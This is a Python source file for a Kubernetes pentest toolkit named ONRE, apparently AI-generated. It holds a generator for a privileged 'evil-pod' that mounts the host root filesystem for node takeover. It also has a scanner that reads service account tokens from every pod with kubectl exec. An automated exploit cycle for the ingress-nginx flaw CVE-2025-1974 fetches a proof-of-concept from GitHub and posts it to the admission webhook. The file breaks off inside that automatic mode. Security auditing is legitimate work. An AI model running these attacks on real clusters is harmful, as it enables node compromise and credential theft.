#!/usr/bin/env python3
"""
k8s_pentest_framework - a small, extendable Kubernetes pentest toolkit for AppSec audits.

This version includes:
 - pod2node privileged-pod YAML generator (shows kubectl apply command and supports editing via $EDITOR/nano/vi)
 - privileged container scanner
 - RBAC token scanner (rewritten from your bash script)
 - ingress checker: extracts ingress controller image/version, checks for CVE-2025-1974 vulnerability, uses PoC annotation from GitHub if vulnerable, and supports manual or automatic exploitation cycle.
 - nodeport scanner
 - envinfo: Gain environment information from a pod
 - registryscan: Search for registries in the cluster and suggest curling them
 - nsbypass: Kubernetes namespaces bypass check (list ns and try access pods)
 - corecheck: Check core components (apiserver flags, etcd no-TLS, kubelet anon access)
 - shell: Spawn a shell and return to menu

Design goals:
 - Single-file, easy to read and extend.
 - Non-destructive by default: nothing is applied without an explicit print+instruction for `kubectl apply`.
 - Clear structure: add new commands by creating a function and registering it in COMMANDS.

Usage: run inside a context that has kubectl configured for the target cluster (your namespace access).

Author: generated for you. Use responsibly.
"""

import subprocess
import tempfile
import json
import os
import sys
from shutil import which
from datetime import datetime
from packaging import version

# ---------------------
# Configuration
# ---------------------
DANGEROUS_PERMISSIONS = [
    "get secrets",
    "create pods",
    "delete pods",
    "get nodes",
    "create deployments",
    "patch deployments",
    "get services",
    "create services",
    "get configmaps",
    "create configmaps",
]

# Safe ingress payload presets (NON-EXPLOITATIVE examples inspired by public PoCs but limited to harmless header injection)
INGRESS_PAYLOAD_PRESETS = {
    'add-header': {
        'description': 'Add a harmless response header (safe for audits)',
        'annotation_key': 'nginx.ingress.kubernetes.io/configuration-snippet',
        'annotation_value': 'add_header X-ONRE-Test "onre-audit";'
    },
    'set-original-url-header': {
        'description': 'Set X-Original-URL header into the response (safe, non-exec)',
        'annotation_key': 'nginx.ingress.kubernetes.io/configuration-snippet',
        'annotation_value': 'add_header X-Original-URL $request_uri;'
    }
}

# URL for the PoC JSON
POC_JSON_URL = "https://raw.githubusercontent.com/sandumjacob/IngressNightmare-POCs/main/CVE-2025-1974/poc.json"

# Global variable to track if banner has been shown in this session
BANNER_SHOWN = False

# ---------------------
# Banner (scary + ONRE)
# ---------------------
BANNER = r'''
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%##+*%%@@%#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%-:::-=++@@%+**@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@%%::...:-++.%%===*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@#%::....-.:..#%::--#*%@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-%=-:...:.*: .##:.:::+%*@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%#*+.:.:.. -#%.:#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*+=+=*%#+=...##+*#%#%#*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##%*#++=-=#--*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%**-=+=*+=-:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+:-::++==%@@@=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-:=-:-=:-%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#-..::...::.*##%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%##=:..-:.   ......+*+*#*#*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%##+-..::=-.    ..:.  ..::=---*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#++*-:..-=-=---:...-.     ..::-=#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*++-.::=-*****#+.-:. . ..:-===#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%**+==-=+*%@%%%%%%+=+...:::==++*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%**==*+-=#+=***=+#=:--::==+=+*#*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##+-=+=---.=---::..-==-++***+*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%*#=+===-:::.....:.:-=:++++***@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%***=++####%##++:=-+++****#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##%#*%%@@@@@@@@%#+=++*#*%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%#%@@@@@@@@@@@@@%+#*##%%%%@%%*.=#@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%@@@@@@@@@@@@@@##*#*#%%@%%. -+#%@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@%%@@@@@@@@@@@@@@@#%##%%%@%%.:+#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%=-*%@@@@@@@@@@*:+###*@%%%@@@@@@@@@@@%%#%%%@%%%.:+#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@#=.+++##@@@@@@@@##%%%%%%#%##%%%%%%%%@%%%%%%%%%#..*#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@#=*##%%%%%@@@@@@@%%%@@%%@%%%%%%%%%@@@@%%@%%%%..:*#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%@@@@@@%%%%@%@%%%%@@@@@@@@@@@@@%+.:*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@###%%%%%%%#*:%@@@@@%%%%@@%%%@@@@@@@@@@%%.:*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%%%%##@@@@%@%%%%%%%@@@@@@@@%%..*%%@@*#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%%%%@@%#=+@@%#%%%%%%%%%+%%%#=..*#%@@@*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#%%%%%%%@%#+=..*#%%%@@%%%*....+#%%%@@@%#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#%%%%%%%%#=...#%%%@@@%%####%%%@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%%%%%%##+.*%%%@@%%%%%%%%@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%*#%%%%%%%@@%@@@@%@@@@@%@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@%%%###############=. .*#%%%%%@@@%%@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@%%%#:. ...... .......   .-#%%%%%@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@%%#... ....-=++-:.:-==-=+*+##%%%%%%%%%@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@%=.  ..++**####%########%#%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@*:.:+*##%##%%%#%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@#+*##%%#%%%@@@@@@@@@@@@@@@%%##%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%%%%%%%%@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%.#%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%+...+#%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%#-.....=*##%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%#........::-=*##@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@%#.. ..:+===*#%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%*...:==*%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%. .=*##%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%#*##%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                     O N R E

             a tiny, extendable k8s pentest toolkit
'''

# ---------------------
# Helpers
# ---------------------

def check_prereqs():
    if which("kubectl") is None:
        print("[!] kubectl not found in PATH. Install it or add to PATH.")
        sys.exit(1)
    if which("curl") is None:
        print("[!] curl not found in PATH. Install it or add to PATH.")
        sys.exit(1)
    if which("nmap") is None:
        print("[!] nmap not found in PATH. Install it for NodePort scanning.")
    if which("etcdctl") is None:
        print("[!] etcdctl not found in PATH. Install it for etcd access check.")


def run(cmd, capture=True, check=False, input=None):
    """Run a shell command. Returns CompletedProcess"""
    try:
        if capture:
            return subprocess.run(cmd, shell=True, check=check, stdout=subprocess.PIPE, stderr=subprocess.PIPE, input=input, text=True)
        else:
            return subprocess.run(cmd, shell=True, check=check)
    except Exception as e:
        return subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(e))


def kubectl_json(cmd_tail):
    """Run kubectl and parse JSON output"""
    cp = run(f"kubectl {cmd_tail} -o json")
    if cp.returncode != 0:
        return None
    try:
        return json.loads(cp.stdout)
    except Exception:
        return None


def detect_editor():
    """Detect an editor: $EDITOR, then nano, then vi/vim. Return command or None."""
    env = os.environ.get('EDITOR')
    if env:
        return env
    for e in ('nano', 'vi', 'vim'):
        if which(e):
            return e
    return None


def edit_tempfile(initial_text, suffix='.yml'):
    """Write initial_text to a temp file, open editor if available, return edited content (or None if not edited)."""
    editor = detect_editor()
    with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix=suffix) as tf:
        path = tf.name
        tf.write(initial_text)
        tf.flush()

    if editor is None:
        print('  [!] No editor found ($EDITOR, nano, vi). Skipping edit. You can manually edit the saved file.')
        with open(path, 'r') as f:
            content = f.read()
        return content, path

    print(f'  Opening editor: {editor} {path}')
    try:
        subprocess.run(f"{editor} {path}", shell=True)
    except Exception as e:
        print(f'  Failed to run editor: {e}')
    with open(path, 'r') as f:
        content = f.read()
    return content, path


# ---------------------
# Modules (functions to extend)
# ---------------------

def pod2node_interactive():
    """Gather nodes, pods and offer to generate a privileged "evil" pod YAML for a specific node.
    Allows editing via editor and prints the exact kubectl apply command (does not run it).
    """
    print("\n[1] pod2node check / privileged-pod generator")
    nodes = kubectl_json("get nodes")
    if not nodes:
        print("  [!] Could not get nodes. Check kubectl context and permissions.")
        return

    node_names = [n['metadata']['name'] for n in nodes.get('items', [])]
    print(f"  Found nodes: {len(node_names)}")
    for i, n in enumerate(node_names, 1):
        print(f"   {i}. {n}")

    choice = input("\nChoose a node index to target (or press Enter to cancel): ").strip()
    if not choice:
        print("Cancelled.")
        return
    try:
        idx = int(choice) - 1
        target_node = node_names[idx]
    except Exception:
        print("Invalid choice")
        return

    # Default YAML
    default_image = 'busybox'
    yaml_template = f"""
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: evil-pod
  name: evil-pod
  namespace: audit
spec:
  nodeName: {target_node}
  hostPID: true
  hostIPC: true
  hostNetwork: true
  volumes:
  - name: host-fs
    hostPath:
      path: /
  containers:
  - image: {default_image}
    name: evil-pod
    command: ["/bin/sh", "-c", "sleep infinity"]
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
    volumeMounts:
    - name: host-fs
      mountPath: /host
  restartPolicy: Never
"""

    print('\nGenerated evil pod YAML (dry run):\n')
    print(yaml_template)

    # Offer to edit
    if input('Edit YAML before saving? [y/N]: ').lower().startswith('y'):
        edited, tmp_path = edit_tempfile(yaml_template, suffix='.yml')
        print('\n--- Edited YAML preview ---\n')
        print(edited)
        final_yaml = edited
    else:
        final_yaml = yaml_template
        tmp_path = None

    # Save
    save_path = input('Save YAML to file path (default ./evil-pod.yml): ').strip() or './evil-pod.yml'
    with open(save_path, 'w') as f:
        f.write(final_yaml)
    print(f'Wrote {save_path}')

    # Show exact kubectl apply command (do not execute)
    print('\nTo apply this manifest (ONLY in authorized test environments) run:')
    print(f'  kubectl apply -f {save_path}')
    print('\nNote: this manifest is privileged. Do NOT apply against systems you do not own.')


def privileged_containers_scan():
    """Search for containers/pods with privileged:true across namespaces and show quick info.
    This function does not attempt to exec into containers — just enumerates.
    """
    print("\n[2] scanning for privileged containers in all namespaces...")
    pods = kubectl_json("get pods --all-namespaces")
    if not pods:
        print("  [!] Could not list pods.")
        return

    found = []
    for p in pods.get('items', []):
        ns = p['metadata']['namespace']
        name = p['metadata']['name']
        for c in p.get('spec', {}).get('containers', []):
            sc = c.get('securityContext') or {}
            if sc.get('privileged') or sc.get('allowPrivilegeEscalation'):
                found.append((ns, name, c.get('name'), c.get('image'), sc))

    if not found:
        print('  No privileged containers found (quick scan).')
        return

    print(f'  Found {len(found)} potentially privileged containers:')
    for ns, pod, cname, image, sc in found:
        print(f'   - {ns}/{pod} container={cname} image={image} sc={sc}')
    print('\nYou can try to exec into them manually with `kubectl exec -n <ns> -it <pod> -c <container> -- /bin/sh`')


def rbac_token_checker():
    """RBAC checker: for each pod try to read the serviceaccount token and check dangerous permissions.
    Mirrors the logic of the bash script you provided, but in Python for easier editing.
    """
    print('\n[3] RBAC token scanner (attempts to read SA tokens from pods)')
    api_server_cp = run("kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}'")
    if api_server_cp.returncode != 0:
        print('  [!] Could not determine API server URL. Aborting.')
        return
    API_SERVER = api_server_cp.stdout.strip().strip("'")

    pods = kubectl_json('get pods --all-namespaces')
    if not pods:
        print('  [!] Could not list pods. Aborting.')
        return

    report_lines = []
    total_pods = 0
    total_dangerous = 0

    for p in pods.get('items', []):
        ns = p['metadata']['namespace']
        name = p['metadata']['name']
        total_pods += 1
        sys.stdout.write(f'  Checking {ns}/{name} ... ')
        sys.stdout.flush()
        # Try to cat the token
        cp = run(f"kubectl exec -n {ns} {name} -- cat /var/run/secrets/kubernetes.io/serviceaccount/token", capture=True)
        token = cp.stdout.strip() if cp.returncode == 0 else ''
        if not token:
            print('no token')
            continue

        # Build a temp kubeconfig
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as tf:
            kubeconfig = tf.name
            tf.write(f"""apiVersion: v1
kind: Config
clusters:
- name: temp-cluster
  cluster:
    insecure-skip-tls-verify: true
    server: {API_SERVER}
users:
- name: temp-user
  user:
    token: {token}
contexts:
- name: temp-context
  context:
    cluster: temp-cluster
    user: temp-user
current-context: temp-context
""")

        # Check permissions
        dangerous_found = []
        for perm in DANGEROUS_PERMISSIONS:
            cp_can = run(f"kubectl --kubeconfig={kubeconfig} auth can-i {perm}")
            if cp_can.returncode == 0 and 'yes' in cp_can.stdout:
                dangerous_found.append(perm)
        os.unlink(kubeconfig)

        if dangerous_found:
            total_dangerous += 1
            sa_name = p.get('spec', {}).get('serviceAccountName')
            print(f"DANGEROUS -> {dangerous_found} (SA: {sa_name})")
            report_lines.append(f"{ns}/{name} -> {dangerous_found} (SA: {sa_name})")
        else:
            print('ok')

    # Summary
    print('\n--- RBAC scan summary ---')
    print(f'  Pods scanned: {total_pods}')
    print(f'  Pods with dangerous SA perms: {total_dangerous}')
    if report_lines:
        print('\nDetailed findings:')
        for l in report_lines:
            print('  ' + l)
    # Save report
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    report_path = f"/tmp/k8s_rbac_report_{ts}.txt"
    with open(report_path, 'w') as rf:
        rf.write('\n'.join(report_lines))
    print(f'  Full report saved to: {report_path}')


def parse_image_version(image):
    """Attempt to parse a k8s image string and return (repo, name, tag)
    Examples:
      'k8s.gcr.io/ingress-nginx/controller:v1.10.0' -> ('k8s.gcr.io/ingress-nginx/controller', 'controller', 'v1.10.0')
      'nginx:1.23.1' -> ('nginx', 'nginx', '1.23.1')
    If tag absent, returns tag as 'latest' or None.
    """
    if not image:
        return (None, None, None)
    parts = image.split('/')
    last = parts[-1]
    if ':' in last:
        name, tag = last.split(':', 1)
    else:
        name, tag = last, 'latest'
    repo = '/'.join(parts[:-1] + [name])
    return repo, name, tag


def ingress_checker():
    """Check for ingress-controller (nginx) pods; extract images and tags.
    Check if version is vulnerable to CVE-2025-1974 (< v1.12.1 or < v1.11.5).
    Supports manual (generate manifest) or automatic (full exploit cycle) modes.
    Uses PoC annotation from GitHub if vulnerable.
    """
    print('\n[4] ingress controller version and CVE-2025-1974 PoC helper')

    # Attempt to download PoC JSON
    print('  Downloading PoC JSON from GitHub...')
    cp = run(f"curl -s {POC_JSON_URL}", capture=True)
    if cp.returncode != 0 or not cp.stdout.strip():
        print('  [!] Failed to download PoC JSON. Falling back to default safe presets.')
        poc_presets = {}
    else:
        try:
            poc_data = json.loads(cp.stdout)
            poc_presets = {}
            for key, value in poc_data.items():
                if isinstance(value, dict) and 'annotation_key' in value and 'annotation_value' in value:
                    poc_presets[key] = value
            if not poc_presets:
                print('  [!] No valid presets found in PoC JSON. Using defaults.')
            else:
                print('  Loaded PoC presets from JSON.')
        except json.JSONDecodeError:
            print('  [!] Invalid JSON in PoC. Using default presets.')
            poc_presets = {}

    namespaces = ['ingress-nginx', 'kube-system', 'default']
    found_entries = []
    vulnerable_entries = []
    for ns in namespaces:
        pods = kubectl_json(f"get pods -n {ns}")
        if not pods:
            continue
        for p in pods.get('items', []):
            name = p['metadata']['name']
            if 'ingress' in name or 'nginx' in name or 'controller' in name:
                for c in p.get('spec', {}).get('containers', []):
                    img = c.get('image')
                    repo, cname, tag = parse_image_version(img)
                    entry = {'namespace': ns, 'pod': name, 'container': c.get('name'), 'image': img, 'repo': repo, 'name': cname, 'tag': tag}
                    found_entries.append(entry)
                    if is_vulnerable_version(tag):
                        vulnerable_entries.append(entry)

    if not found_entries:
        print('  No obvious ingress controller pods found in common namespaces. You may still run a cluster-wide search.')
        if input('Run cluster-wide pod search for "ingress"/"nginx" in pod names? [y/N]: ').lower().startswith('y'):
            pods = kubectl_json('get pods --all-namespaces')
            if pods:
                for p in pods.get('items', []):
                    pname = p['metadata']['name']
                    if 'ingress' in pname or 'nginx' in pname:
                        ns = p['metadata']['namespace']
                        for c in p.get('spec', {}).get('containers', []):
                            img = c.get('image')
                            repo, cname, tag = parse_image_version(img)
                            entry = {'namespace': ns, 'pod': pname, 'container': c.get('name'), 'image': img, 'repo': repo, 'name': cname, 'tag': tag}
                            found_entries.append(entry)
                            if is_vulnerable_version(tag):
                                vulnerable_entries.append(entry)

    if not found_entries:
        print('  Still nothing found. Aborting ingress helper.')
        return

    print('\nDetected ingress-like pods and their images:')
    for i, e in enumerate(found_entries, 1):
        vuln_status = "VULNERABLE to CVE-2025-1974" if e in vulnerable_entries else "Not vulnerable"
        print(f"  {i}. {e['namespace']}/{e['pod']} -> image={e['image']} tag={e['tag']} ({vuln_status})")

    # Choose mode
    if vulnerable_entries and 'cve-2025-1974' in poc_presets:
        print('\nVulnerable ingress controller detected!')
        print('Choose exploitation mode:')
        print('  1. Manual: Generate Ingress manifest with PoC annotation and show instructions.')
        print('  2. Automatic: Run full CVE-2025-1974 exploit cycle (create service, apply manifest, port-forward, send PoC request, check logs, clean up).')
        mode_choice = input('Select mode (1 or 2, or press Enter for manual): ').strip() or '1'
        mode = 'auto' if mode_choice == '2' else 'manual'
    else:
        mode = 'manual'
        print('\nNo vulnerable versions or PoC preset found. Using manual mode with preset selection.')

    # Manual mode
    if mode == 'manual':
        # Allow user to pick a target
        choice = input('\nChoose an entry index to base payload suggestions on (or press Enter to skip): ').strip()
        target = None
        if choice:
            try:
                idx = int(choice) - 1
                target = found_entries[idx]
            except Exception:
                print('Invalid index, skipping selection.')

        # Use PoC if vulnerable and available, otherwise show presets
        if target in vulnerable_entries and 'cve-2025-1974' in poc_presets:
            print('\nTarget is vulnerable! Using CVE-2025-1974 PoC annotation.')
            preset = poc_presets['cve-2025-1974']
        else:
            print('\nAvailable payload presets:')
            keys = list(INGRESS_PAYLOAD_PRESETS.keys()) + list(poc_presets.keys())
            for i, k in enumerate(keys, 1):
                preset_dict = poc_presets if k in poc_presets else INGRESS_PAYLOAD_PRESETS
                print(f"  {i}. {k} - {preset_dict[k]['description']}")

            pchoice = input('\nChoose a preset by number (or press Enter to cancel): ').strip()
            if not pchoice:
                print('Cancelled ingress payload creation.')
                return
            try:
                pidx = int(pchoice) - 1
                preset_key = keys[pidx]
                preset = poc_presets[preset_key] if preset_key in poc_presets else INGRESS_PAYLOAD_PRESETS[preset_key]
            except Exception:
                print('Invalid preset choice. Aborting.')
                return

        # Build Ingress manifest
        ingress_name = input('Ingress name to create (default: onre-audit-ingress): ').strip() or 'onre-audit-ingress'
        ingress_ns = input('Namespace for the Ingress (default: default): ').strip() or 'default'
        host = input('Host for the Ingress (example: example.local) [optional]: ').strip() or ''

        annotation_block = f"""  annotations:
    {preset['annotation_key']}: |
      {preset['annotation_value']}
"""

        host_block = f"""  rules:
  - host: {host}
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: dummy-svc
            port:
              number: 80
""" if host else """  rules:
  - http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: dummy-svc
            port:
              number: 80
"""

        ingress_yaml = f"""
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: {ingress_name}
  namespace: {ingress_ns}
{annotation_block}
spec:
{host_block}
"""

        print('\nGenerated Ingress manifest (dry run):\n')
        print(ingress_yaml)

        # Allow editing
        if input('Edit Ingress manifest before saving? [y/N]: ').lower().startswith('y'):
            edited, tmp_path = edit_tempfile(ingress_yaml, suffix='.yml')
            print('\n--- Edited Ingress preview ---\n')
            print(edited)
            final_yaml = edited
        else:
            final_yaml = ingress_yaml
            tmp_path = None

        save_path = input('Save Ingress YAML to file path (default ./onre-ingress.yml): ').strip() or './onre-ingress.yml'
        with open(save_path, 'w') as f:
            f.write(final_yaml)
        print(f'Wrote {save_path}')

        print('\nTo apply this manifest (ONLY in authorized test environments) run:')
        print(f'  kubectl apply -f {save_path}')

        print('\nFull exploitation cycle guidance for CVE-2025-1974 (manual mode):')
        print('  1. Ensure a dummy service exists (or create one):')
        print(f'     kubectl create svc clusterip dummy-svc --tcp=80 -n {ingress_ns}')
        print('  2. Apply the Ingress manifest:')
        print(f'     kubectl apply -f {save_path}')
        print('  3. Determine the Ingress controller external IP or domain:')
        print('     kubectl get svc -n ingress-nginx')
        print('  4. Test the exploitation (adjust path based on PoC specifics):')
        print(f'     curl -v http://<ingress-ip>/<vulnerable-path> -H "Host: {host}"')
        print('  5. Verify if the annotation triggered the expected behavior (check logs or response).')
        print('  6. Clean up after testing:')
        print(f'     kubectl delete -f {save_path}')
        print('\nWARNING: Using PoC payloads may be destructive. Use only in authorized test environments.')

    # Automatic mode
    else:
        print('\nWARNING: Automatic mode will perform the full CVE-2025-1974 exploit cycle, which may be destructive.')
        confirm = input('Are you sure you want to proceed in automatic mode? [y/N]: ').lower()
        if not confirm.startswith('y'):
            print('Automatic mode cancelled.')
            return

        target = vulnerable_entries[0]  # Use first vulnerable entry
        preset = poc_presets['cve-2025-1974']
        ingress_name = 'onre-audit-ingress'
        ingress_ns = target['namespace']
        host = 'example.local'

        # Step 1: Ensure dummy service exists
        print('\nStep 1: Checking/creating dummy service...')
        svc_check = run(f"kubectl get svc dummy-svc -n {ingress_ns}", capture=True)
        if svc_check.returncode != 0:
            print('  Creating dummy service...')
            cp = run(f"kubectl create svc clusterip dummy-svc --tcp=80 -n {ingress_ns}", capture=True)
            if cp.returncode != 0:
                print(f'  [!] Failed to create dummy service: {cp.stderr}')
                return

        # Step 2: Create and apply Ingress manifest
        annotation_block = f"""  annotations:
    {preset['annotation_key']}: |
      {preset['annotation_value']}
"""
        host_block = f"""  rules:
  - host: {host}
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: dummy-svc
            port:
              number: 80
"""
        ingress_yaml = f"""
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: {ingress_name}
  namespace: {ingress_ns}
{annotation_block}
spec:
{host_block}
"""
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.yml') as tf:
            tf.write(ingress_yaml)
            save_path = tf.name

        print('\nStep 2: Applying Ingress manifest...')
        cp = run(f"kubectl apply -f {save_path}", capture=True)
        if cp.returncode != 0:
            print(f'  [!] Failed to apply Ingress manifest: {cp.stderr}')
            os.unlink(save_path)
            return
        print(f'  Applied Ingress {ingress_name} in namespace {ingress_ns}')

        # Step 3: Port-forward to webhook
        print('\nStep 3: Setting up port-forward to webhook (port 8443)...')
        local_port = 1337
        port_forward_cmd = f"kubectl port-forward -n {target['namespace']} {target['pod']} {local_port}:8443"
        # Run port-forward in background
        port_forward_proc = subprocess.Popen(port_forward_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        import time
        time.sleep(2)  # Wait for port-forward to establish

        # Check if port-forward is running
        if port_forward_proc.poll() is not None:
            print(f'  [!] Failed to set up port-forward: {port_forward_proc.stderr.read()}')
            run(f"kubectl delete -f {save_path}", capture=True)
            os.unlink(save_path)
            return

        # Step 4: Send AdmissionReview request
        print('\nStep 4: Sending AdmissionReview request...')
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.json') as tf:
            tf.write(json.dumps(poc_data))
            poc_path = tf.name
        curl_cmd = f"curl --insecure -v -H 'Content-Type: application/json' --data @{poc_path} https://localhost:{local_port}/fake/path"
        cp = run(curl_cmd, capture=True)
        os.unlink(poc_path)
